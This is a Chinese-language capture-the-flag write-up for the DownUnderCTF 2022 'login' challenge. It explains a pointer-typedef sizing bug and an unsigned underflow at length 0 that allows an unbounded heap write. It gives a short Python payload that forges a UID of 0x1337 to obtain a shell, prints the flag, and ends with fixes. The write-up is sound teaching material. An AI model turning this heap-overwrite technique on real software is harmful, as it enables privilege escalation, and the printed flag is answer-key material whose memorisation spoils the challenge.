# DownUnderCTF 2022 login Writeup

## 题目简述

程序允许添加用户并按用户名登录；若匹配用户的 UID 为 `0x1337`，就执行 `system("/bin/sh")`。用户结构定义本身埋有一个尺寸错误：

```c
typedef struct {
    int uid;
    char username[0x18];
} *user_t;

user_t user = (user_t)malloc(sizeof(user_t));
```

`user_t` 是指针类型，所以 `sizeof(user_t)` 只有 8，而真实结构需要 28 字节。更关键的是可控长度读取在长度为 0 时发生无符号下溢，形成无界堆写。

## 解题过程

读取循环为：

```c
size_t i = 0;
while (i <= n - 1) {
    /* read one byte */
    buf[i++] = c;
}
```

当传入 `n = 0` 时，`n - 1` 变成 `SIZE_MAX`，循环会一直写到遇到换行。第一次 `malloc(8)` 实际得到 glibc 最小尺寸的 `0x20` chunk，可从 `username` 跨过当前 chunk，覆盖 top chunk 元数据和下一次分配将返回的用户数据。

第一次添加用户时发送：

```python
payload = (
    b'X' * 20       # 从 username 写到 top chunk 元数据前
    + p64(0x2000)   # 给 top chunk 保留可接受的 size
    + p32(0x1337)   # 预置下一次分配的 uid
    + b'x'          # 预置下一用户的 username
)
add_user(0, payload)
```

随后再添加一个短用户名用户：

```python
add_user(2, b'x')
login(b'x')
```

第二次 `malloc` 返回刚才预写的区域。初始化逻辑只有在 `user->uid` 为 0 时才赋普通 UID；预置值 `0x1337` 非零，因此管理员 UID 被保留。用 `x` 登录即可进入 shell，并读取：

```text
DUCTF{th3_4uth_1s_s0_bad_1t_d0esnt_ev3n_us3_p4ssw0rds}
```

## 方法总结

本题组合了指针 typedef 误用、未初始化堆内存和无符号下溢。单独的结构体越界不足以直接改到相邻 UID，但长度 0 提供了足够远的写能力，可以预先布置下一次分配的对象。安全实现应为实际结构分配 `sizeof(*user)`、使用 `calloc` 或显式初始化，并把读取条件写成不会在 0 上下溢的 `i < n`。
